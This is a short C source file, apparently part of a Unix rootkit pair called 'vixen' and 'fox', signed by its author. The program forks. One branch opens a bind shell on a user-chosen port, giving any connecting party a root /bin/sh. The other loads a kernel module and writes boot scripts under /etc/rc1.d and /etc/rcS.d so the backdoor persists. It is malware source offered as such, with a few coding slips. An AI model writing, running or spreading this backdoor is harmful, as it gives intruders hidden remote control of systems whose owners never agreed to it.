/*
**
**              nemski was here
**
**              10/04/2011
**              Can you believe it's almost 2 years between me writing vixen and fox?
**
*/

#include <stdio.h>
#include <unistd.h>
#include <netinet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <inttypes.h>

int main(int argc, char *argv[]) {

	int a, i;
 	FILE *fp;
 	char *x;

    if (argc < 2) {
        printf("Usage %s \n", argv[0]);
        exit(0);
    }

    a=fork();
    if (a < 0) {
		printf("Could not fork process\n");
		exit(0);
	}

	if (a == 0) {
		evilL(argv[1]);
	} else {
		execl("/usr/sbin/modload", "/root/vixen/vixen");
		if((fp = fopen("/etc/rc1.d/K01fox", "w")) == NULL) {
			printf("failed to open rc1.d/K01fox for writing\n");
			exit(0);
		}

		fprintf(fp, "#!/sbin/sh\n/root/vixen/fox %s\n", argv[1]);
		fclose(fp);
		if((fp = fopen("/etc/rcS.d/K01fox", "w")) == NULL) {
			printf("failed to open rcS.d/K01fox for writing\n");
			exit(0);
		}

		fprintf(fp, "#!/sbin/sh\n/root/vixen/fox %s\n", argv[1]);
		fclose(fp);
	}

	return 0;
}

int evilL(port) {
	struct sockaddr_in sin;
	int s, c, i, p;
	p = atoi(port);
	s = socket(AF_INET,SOCK_STREAM, 0);
	if (s < 0)  {
		printf("Error opening socket\n");
		return -1;
	}

	sin.sin_port = htons(p);
	sin.sin_addr.s_addr=0;
	sin.sin_addr.s_addr = INADDR_ANY;
	sin.sin_family = AF_INET;

	if(bind(s,(struct sockaddr *)&sin, sizeof(struct sockaddr_in) ) == -1) {
		printf("Error binding socket\n");
		return -1;
	}

	listen(s, 1);
	c=accept(s,0,0);
	for(i=2; i >= 0; i--) {
		dup2(c,i);
	}
		
 	execl("/bin/sh", "sh", NULL);

	return 0;
}